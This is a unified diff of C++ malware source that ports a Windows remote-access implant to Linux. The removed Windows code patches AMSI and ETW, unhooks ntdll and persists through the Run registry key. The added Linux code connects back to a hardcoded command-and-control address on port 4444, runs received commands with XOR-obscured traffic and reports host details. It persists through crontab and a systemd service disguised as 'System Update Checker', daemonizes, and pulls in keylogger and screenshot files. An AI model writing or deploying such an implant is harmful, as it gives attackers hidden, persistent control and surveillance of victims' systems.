@@ -1,206 +1,252 @@
-#define _CRT_SECURE_NO_WARNINGS
-#define WIN32_LEAN_AND_MEAN
-
-#include <windows.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
-#include <wininet.h>
-#include <tlhelp32.h>
-#include <shlobj.h>
+// agent_linux.cpp
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <time.h>
+#include <sys/stat.h>
+#include <pwd.h>
+#include <sys/utsname.h>
 #include <string>
-#include <cmath>
-#include <ctime>
+#include <sstream>
+#include <fstream>
 
-#pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "shell32.lib")
-
-#define C2_SERVER "127.0.0.1"
+// ============= CONFIGURATION =============
+#define C2_SERVER "10.28.104.143"  // Kali IP
 #define C2_PORT 4444
-#define SLEEP_TIME 5000
+#define SLEEP_TIME 5
 #define XOR_KEY 0x42
+#define BUFFER_SIZE 8192
 
-//=============================================================================
-// EVASION MODULE
-//=============================================================================
-
-bool BypassAMSI() {
-    HMODULE hAmsi = LoadLibraryA("amsi.dll");
-    if (!hAmsi) return false;
-    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
-    if (!pAmsiScanBuffer) return false;
-    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    DWORD oldProtect;
-    if (VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        memcpy((void*)pAmsiScanBuffer, patch, sizeof(patch));
-        VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
-        FlushInstructionCache(GetCurrentProcess(), (LPCVOID)pAmsiScanBuffer, sizeof(patch));
-        return true;
-    }
-    return false;
-}
-
-bool BypassAMSI_Alternative() {
-    HMODULE hAmsi = LoadLibraryA("amsi.dll");
-    if (!hAmsi) return false;
-    FARPROC pAmsiOpenSession = GetProcAddress(hAmsi, "AmsiOpenSession");
-    if (!pAmsiOpenSession) return false;
-    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
-    DWORD oldProtect;
-    if (VirtualProtect((LPVOID)pAmsiOpenSession, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        memcpy((void*)pAmsiOpenSession, patch, sizeof(patch));
-        VirtualProtect((LPVOID)pAmsiOpenSession, sizeof(patch), oldProtect, &oldProtect);
-        return true;
-    }
-    return false;
-}
-
-bool BypassETW() {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return false;
-    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-    if (!pEtwEventWrite) return false;
-    BYTE patch[] = { 0xC3 };
-    DWORD oldProtect;
-    if (VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        memcpy((void*)pEtwEventWrite, patch, sizeof(patch));
-        VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
-        return true;
-    }
-    return false;
-}
-
-bool DisableEventLogging() {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return false;
-    const char* functions[] = {"EtwEventWrite", "EtwEventWriteFull", "EtwEventWriteTransfer"};
-    BYTE patch[] = { 0xC3 };
-    bool success = true;
-    for (const char* func : functions) {
-        FARPROC pFunc = GetProcAddress(hNtdll, func);
-        if (pFunc) {
-            DWORD oldProtect;
-            if (VirtualProtect((LPVOID)pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-                memcpy((void*)pFunc, patch, sizeof(patch));
-                VirtualProtect((LPVOID)pFunc, sizeof(patch), oldProtect, &oldProtect);
-            } else success = false;
+// ============= DEBUG LOGGING =============
+#ifdef DEBUG
+    #define LOG(msg) WriteLog(msg)
+    void WriteLog(const char* msg) {
+        FILE* f = fopen("/tmp/agent_log.txt", "a");
+        if (f) {
+            time_t now = time(NULL);
+            fprintf(f, "[%ld] %s\n", now, msg);
+            fclose(f);
         }
     }
-    return success;
-}
+#else
+    #define LOG(msg)
+#endif
 
-bool UnhookNtdll() {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return false;
-    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return false;
-    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-    if (!hMapping) { CloseHandle(hFile); return false; }
-    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
-    if (!pMapping) { CloseHandle(hMapping); CloseHandle(hFile); return false; }
-    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
-    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hNtdll + pDosHeader->e_lfanew);
-    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
-        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((LPBYTE)IMAGE_FIRST_SECTION(pNtHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
-        if (strcmp((char*)pSection->Name, ".text") == 0) {
-            DWORD oldProtect;
-            LPVOID pTextSection = (LPVOID)((LPBYTE)hNtdll + pSection->VirtualAddress);
-            if (VirtualProtect(pTextSection, pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-                memcpy(pTextSection, (LPVOID)((LPBYTE)pMapping + pSection->VirtualAddress), pSection->Misc.VirtualSize);
-                VirtualProtect(pTextSection, pSection->Misc.VirtualSize, oldProtect, &oldProtect);
-            }
-            break;
-        }
-    }
-    UnmapViewOfFile(pMapping);
-    CloseHandle(hMapping);
-    CloseHandle(hFile);
-    return true;
-}
+//=============================================================================
+// EVASION & PERSISTENCE
+//=============================================================================
 
 bool IsSandbox() {
+    LOG("Checking for sandbox...");
     int detectionCount = 0;
-    MEMORYSTATUSEX memStatus;
-    memStatus.dwLength = sizeof(memStatus);
-    GlobalMemoryStatusEx(&memStatus);
-    if (memStatus.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) detectionCount++;
-    SYSTEM_INFO si;
-    GetSystemInfo(&si);
-    if (si.dwNumberOfProcessors < 2) detectionCount++;
-    if (GetTickCount64() < 600000) detectionCount++;
-    return (detectionCount >= 2);
+    
+    // Check for common sandbox indicators
+    if (access("/sys/hypervisor", F_OK) == 0) detectionCount++;
+    if (access("/proc/vz", F_OK) == 0) detectionCount++;  // OpenVZ
+    if (access("/proc/bc", F_OK) == 0) detectionCount++;   // Virtuozzo
+    
+    // Check uptime (less than 10 minutes)
+    FILE* f = fopen("/proc/uptime", "r");
+    if (f) {
+        double uptime;
+        if (fscanf(f, "%lf", &uptime) == 1) {
+            if (uptime < 600) detectionCount++;
+        }
+        fclose(f);
+    }
+    
+    // Check CPU count
+    long nprocs = sysconf(_SC_NPROCESSORS_ONLN);
+    if (nprocs < 2) detectionCount++;
+    
+    bool isSandbox = (detectionCount >= 2);
+    if (isSandbox) {
+        LOG("Sandbox detected!");
+    }
+    return isSandbox;
+}
+
+bool InstallCronPersistence() {
+    LOG("Installing cron persistence...");
+    
+    char exePath[1024];
+    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
+    if (len == -1) return false;
+    exePath[len] = '\0';
+    
+    // Add to crontab
+    char cmd[2048];
+    snprintf(cmd, sizeof(cmd), 
+        "(crontab -l 2>/dev/null; echo \"@reboot %s &\") | crontab -", exePath);
+    
+    int ret = system(cmd);
+    LOG(ret == 0 ? "Cron persistence installed" : "Cron persistence failed");
+    return (ret == 0);
+}
+
+bool InstallSystemdPersistence() {
+    LOG("Installing systemd persistence...");
+    
+    char exePath[1024];
+    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
+    if (len == -1) return false;
+    exePath[len] = '\0';
+    
+    const char* home = getenv("HOME");
+    if (!home) return false;
+    
+    char servicePath[1024];
+    snprintf(servicePath, sizeof(servicePath), 
+        "%s/.config/systemd/user/update-checker.service", home);
+    
+    // Create .config/systemd/user directory
+    char dirPath[1024];
+    snprintf(dirPath, sizeof(dirPath), "%s/.config/systemd/user", home);
+    system(("mkdir -p " + std::string(dirPath)).c_str());
+    
+    FILE* f = fopen(servicePath, "w");
+    if (!f) return false;
+    
+    fprintf(f, "[Unit]\n");
+    fprintf(f, "Description=System Update Checker\n");
+    fprintf(f, "After=network.target\n\n");
+    fprintf(f, "[Service]\n");
+    fprintf(f, "ExecStart=%s\n", exePath);
+    fprintf(f, "Restart=always\n");
+    fprintf(f, "RestartSec=10\n\n");
+    fprintf(f, "[Install]\n");
+    fprintf(f, "WantedBy=default.target\n");
+    fclose(f);
+    
+    system("systemctl --user daemon-reload");
+    system("systemctl --user enable update-checker.service");
+    system("systemctl --user start update-checker.service");
+    
+    LOG("Systemd persistence installed");
+    return true;
 }
 
 //=============================================================================
 // NETWORK
 //=============================================================================
 
-SOCKET ConnectToC2(const char* server, int port) {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return INVALID_SOCKET;
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) { WSACleanup(); return INVALID_SOCKET; }
-    sockaddr_in serverAddr;
+void XorCrypt(unsigned char* data, size_t size, unsigned char key) {
+    for (size_t i = 0; i < size; i++) {
+        data[i] ^= key;
+    }
+}
+
+int ConnectToC2(const char* server, int port) {
+    char logMsg[256];
+    snprintf(logMsg, sizeof(logMsg), "Connecting to %s:%d", server, port);
+    LOG(logMsg);
+    
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        LOG("Socket creation failed");
+        return -1;
+    }
+    
+    struct sockaddr_in serverAddr;
+    memset(&serverAddr, 0, sizeof(serverAddr));
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(port);
-    inet_pton(AF_INET, server, &serverAddr.sin_addr);
-    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        closesocket(sock);
-        WSACleanup();
-        return INVALID_SOCKET;
+    
+    if (inet_pton(AF_INET, server, &serverAddr.sin_addr) <= 0) {
+        LOG("Invalid address");
+        close(sock);
+        return -1;
     }
+    
+    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
+        snprintf(logMsg, sizeof(logMsg), "Connection failed: %s", strerror(errno));
+        LOG(logMsg);
+        close(sock);
+        return -1;
+    }
+    
+    LOG("Connected successfully!");
     return sock;
 }
 
-bool SendData(SOCKET sock, const char* data, int len) {
-    int totalSent = 0;
+bool SendData(int sock, const char* data, size_t len) {
+    size_t totalSent = 0;
     while (totalSent < len) {
-        int sent = send(sock, data + totalSent, len - totalSent, 0);
-        if (sent == SOCKET_ERROR) return false;
+        ssize_t sent = send(sock, data + totalSent, len - totalSent, 0);
+        if (sent < 0) return false;
         totalSent += sent;
     }
     return true;
 }
 
-int ReceiveData(SOCKET sock, char* buffer, int bufferSize) {
-    return recv(sock, buffer, bufferSize, 0);
-}
+//=============================================================================
+// SYSTEM INFO
+//=============================================================================
 
-void XorEncrypt(BYTE* data, SIZE_T size, BYTE key) {
-    for (SIZE_T i = 0; i < size; i++) data[i] ^= key;
-}
-
-void XorDecrypt(BYTE* data, SIZE_T size, BYTE key) {
-    XorEncrypt(data, size, key);
+std::string GetSystemInfo() {
+    char hostname[256];
+    char username[256];
+    struct utsname unameData;
+    
+    gethostname(hostname, sizeof(hostname));
+    
+    struct passwd* pw = getpwuid(getuid());
+    if (pw) {
+        strncpy(username, pw->pw_name, sizeof(username) - 1);
+    } else {
+        strcpy(username, "unknown");
+    }
+    
+    uname(&unameData);
+    
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+    
+    char buffer[2048];
+    snprintf(buffer, sizeof(buffer), "SYSINFO|%s|%s|%s %s|%s",
+        hostname, username, unameData.sysname, unameData.release, cwd);
+    
+    return std::string(buffer);
 }
 
 //=============================================================================
-// STATEFUL SHELL - Professional version
+// SHELL EXECUTION
 //=============================================================================
 
 std::string currentDirectory;
 
 std::string GetCurrentDir() {
-    char buffer[MAX_PATH];
-    GetCurrentDirectoryA(MAX_PATH, buffer);
-    return std::string(buffer);
+    char buffer[1024];
+    if (getcwd(buffer, sizeof(buffer)) != NULL) {
+        return std::string(buffer);
+    }
+    return "/tmp";
 }
 
-std::string ExecuteCommandStateful(const char* command) {
+std::string ExecuteCommand(const char* command) {
     std::string cmd(command);
     
-    // Handle CD command specially
-    if (cmd.length() >= 2 && (cmd.substr(0, 3) == "cd " || cmd.substr(0, 3) == "CD ")) {
+    // Handle CD command
+    if (cmd.substr(0, 3) == "cd ") {
         std::string newDir = cmd.substr(3);
         // Trim whitespace
         size_t start = newDir.find_first_not_of(" \t\r\n");
         size_t end = newDir.find_last_not_of(" \t\r\n");
-        if (start != std::string::npos && end != std::string::npos) {
+        if (start != std::string::npos) {
             newDir = newDir.substr(start, end - start + 1);
         }
         
-        if (SetCurrentDirectoryA(newDir.c_str())) {
+        if (chdir(newDir.c_str()) == 0) {
             currentDirectory = GetCurrentDir();
             return currentDirectory + "\n";
         } else {
@@ -208,120 +254,51 @@ std::string ExecuteCommandStateful(const char* command) {
         }
     }
     
-    // Execute normal command
-    char buffer[4096];
+    // Execute command
+    std::string fullCmd = "cd " + currentDirectory + " && " + cmd + " 2>&1";
+    
+    FILE* pipe = popen(fullCmd.c_str(), "r");
+    if (!pipe) {
+        return "Error: Command execution failed\n";
+    }
+    
     std::string result;
-    SECURITY_ATTRIBUTES sa;
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-    sa.bInheritHandle = TRUE;
-    sa.lpSecurityDescriptor = NULL;
-    HANDLE hReadPipe, hWritePipe;
-    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
-        return "Error: CreatePipe failed\n";
-    }
-    STARTUPINFOA si = { sizeof(si) };
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.hStdOutput = hWritePipe;
-    si.hStdError = hWritePipe;
-    si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi;
-    std::string cmdLine = "cmd.exe /c " + std::string(command);
-    if (!CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, currentDirectory.c_str(), &si, &pi)) {
-        CloseHandle(hReadPipe);
-        CloseHandle(hWritePipe);
-        return "Error: CreateProcess failed\n";
-    }
-    CloseHandle(hWritePipe);
-    DWORD bytesRead;
-    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-        buffer[bytesRead] = '\0';
+    char buffer[4096];
+    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
         result += buffer;
     }
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(hReadPipe);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    
+    pclose(pipe);
     return result;
 }
 
 //=============================================================================
-// PERSISTENCE
+// REVERSE SHELL
 //=============================================================================
 
-bool InstallRegistryPersistence(const char* execPath, const char* name) {
-    HKEY hKey;
-    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) return false;
-    LONG result = RegSetValueExA(hKey, name, 0, REG_SZ, (BYTE*)execPath, (DWORD)strlen(execPath) + 1);
-    RegCloseKey(hKey);
-    return (result == ERROR_SUCCESS);
-}
-
-std::string GetExecutablePath() {
-    char path[MAX_PATH];
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-    return std::string(path);
-}
-
-//=============================================================================
-// UTILS
-//=============================================================================
-
-void HideConsole() {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-}
-
-void EvasiveSleep(DWORD ms) {
-    DWORD start = GetTickCount();
-    volatile double result = 0;
-    for (int i = 0; i < 1000000; i++) result += sqrt((double)i);
-    DWORD elapsed = GetTickCount() - start;
-    if (ms > elapsed) Sleep(ms - elapsed);
-}
-
-void RandomDelay() {
-    srand((unsigned)time(NULL));
-    int delay = 5000 + (rand() % 10000);
-    EvasiveSleep(delay);
-}
-
-std::string GetSystemInfo() {
-    char computerName[MAX_PATH];
-    char userName[MAX_PATH];
-    DWORD size = MAX_PATH;
-    GetComputerNameA(computerName, &size);
-    size = MAX_PATH;
-    GetUserNameA(userName, &size);
-    OSVERSIONINFOA osvi;
-    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
-    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
-    GetVersionExA(&osvi);
-    char buffer[1024];
-    snprintf(buffer, sizeof(buffer), "SYSINFO|%s|%s|Windows %d.%d|%s",
-        computerName, userName, osvi.dwMajorVersion, osvi.dwMinorVersion, GetCurrentDir().c_str());
-    return std::string(buffer);
-}
-
-//=============================================================================
-// OPTIMIZED REVERSE SHELL
-//=============================================================================
-
-void ReverseShell(SOCKET sock) {
-    char buffer[8192];
+void ReverseShell(int sock) {
+    LOG("Entering reverse shell");
+    char buffer[BUFFER_SIZE];
     
     // Initialize current directory
     currentDirectory = GetCurrentDir();
     
     // Send system info
     std::string sysInfo = GetSystemInfo();
-    SendData(sock, sysInfo.c_str(), (int)sysInfo.length());
+    LOG("Sending system info");
+    SendData(sock, sysInfo.c_str(), sysInfo.length());
     SendData(sock, "\n", 1);
     
     while (true) {
-        int bytesReceived = ReceiveData(sock, buffer, sizeof(buffer) - 1);
-        if (bytesReceived <= 0) break;
+        memset(buffer, 0, sizeof(buffer));
+        ssize_t bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
         
-        // Find newline BEFORE decrypting
+        if (bytesReceived <= 0) {
+            LOG("Connection closed");
+            break;
+        }
+        
+        // Find newline
         int cmdLen = bytesReceived;
         for (int i = 0; i < bytesReceived; i++) {
             if (buffer[i] == '\n' || buffer[i] == '\r') {
@@ -330,69 +307,122 @@ void ReverseShell(SOCKET sock) {
             }
         }
         
-        // Decrypt command
-        XorDecrypt((BYTE*)buffer, cmdLen, XOR_KEY);
+        // Decrypt
+        XorCrypt((unsigned char*)buffer, cmdLen, XOR_KEY);
         buffer[cmdLen] = '\0';
         
-        // Trim whitespace
+        // Trim
         char* cmd = buffer;
         while (*cmd == ' ' || *cmd == '\t') cmd++;
         
         if (strlen(cmd) == 0) continue;
         
+        LOG(cmd);
+        
         // Handle exit
-        if (strcmp(cmd, "exit") == 0) break;
+        if (strcmp(cmd, "exit") == 0) {
+            LOG("Exit command received");
+            break;
+        }
         
         // Handle persist
         if (strncmp(cmd, "persist", 7) == 0) {
-            std::string path = GetExecutablePath();
-            std::string response = InstallRegistryPersistence(path.c_str(), "WindowsUpdate") ? 
-                "PERSIST|SUCCESS\n" : "PERSIST|FAILED\n";
-            SendData(sock, response.c_str(), (int)response.length());
+            bool success = InstallCronPersistence() || InstallSystemdPersistence();
+            std::string response = success ? "PERSIST|SUCCESS\n" : "PERSIST|FAILED\n";
+            SendData(sock, response.c_str(), response.length());
             continue;
         }
         
         // Handle sysinfo
         if (strcmp(cmd, "sysinfo") == 0) {
             std::string info = GetSystemInfo() + "\n";
-            SendData(sock, info.c_str(), (int)info.length());
+            SendData(sock, info.c_str(), info.length());
             continue;
         }
         
-        // Execute command with stateful directory
-        std::string output = ExecuteCommandStateful(cmd);
+        // Execute command
+        std::string output = ExecuteCommand(cmd);
         
         // Encrypt and send
-        std::string encOutput = output;
-        XorEncrypt((BYTE*)&encOutput[0], encOutput.length(), XOR_KEY);
-        SendData(sock, encOutput.c_str(), (int)encOutput.length());
+        XorCrypt((unsigned char*)&output[0], output.length(), XOR_KEY);
+        SendData(sock, output.c_str(), output.length());
         SendData(sock, "\n", 1);
     }
     
-    closesocket(sock);
+    close(sock);
+    LOG("Shell closed");
+}
+
+//=============================================================================
+// DAEMONIZE
+//=============================================================================
+
+void Daemonize() {
+    pid_t pid = fork();
+    if (pid < 0) exit(1);
+    if (pid > 0) exit(0);  // Parent exits
+    
+    if (setsid() < 0) exit(1);
+    
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+    
+    pid = fork();
+    if (pid < 0) exit(1);
+    if (pid > 0) exit(0);
+    
+    umask(0);
+    chdir("/");
+    
+    // Close standard file descriptors
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+    
+    // Redirect to /dev/null
+    open("/dev/null", O_RDONLY);
+    open("/dev/null", O_WRONLY);
+    open("/dev/null", O_WRONLY);
 }
 
 //=============================================================================
 // MAIN
 //=============================================================================
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    HideConsole();
-    if (IsSandbox()) { Sleep(60000); return 0; }
-    RandomDelay();
-    UnhookNtdll();
-    BypassAMSI();
-    BypassAMSI_Alternative();
-    BypassETW();
-    DisableEventLogging();
+int main(int argc, char* argv[]) {
+    LOG("Agent started");
+    
+    // Daemonize (background process)
+    #ifndef DEBUG
+    Daemonize();
+    #endif
+    
+    // SANDBOX CHECK - commented for testing
+    // if (IsSandbox()) {
+    //     LOG("Sandbox detected - exiting");
+    //     sleep(60);
+    //     return 0;
+    // }
+    
+    LOG("Starting connection loop");
     while (true) {
-        SOCKET sock = ConnectToC2(C2_SERVER, C2_PORT);
-        if (sock != INVALID_SOCKET) ReverseShell(sock);
-        EvasiveSleep(SLEEP_TIME);
+        int sock = ConnectToC2(C2_SERVER, C2_PORT);
+        if (sock >= 0) {
+            ReverseShell(sock);
+        }
+        
+        LOG("Sleeping before retry");
+        sleep(SLEEP_TIME);
     }
+    
     return 0;
 }
 
-int main() {
-    return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOW);
-}
+// Include surveillance headers
+#ifdef _WIN32
+    #include "surveillance/keylogger.cpp"
+    #include "surveillance/screenrecorder.cpp"
+#else
+    #include "surveillance/keylogger_linux.cpp"
+    #include "surveillance/screenshot_linux.cpp"
+#endif
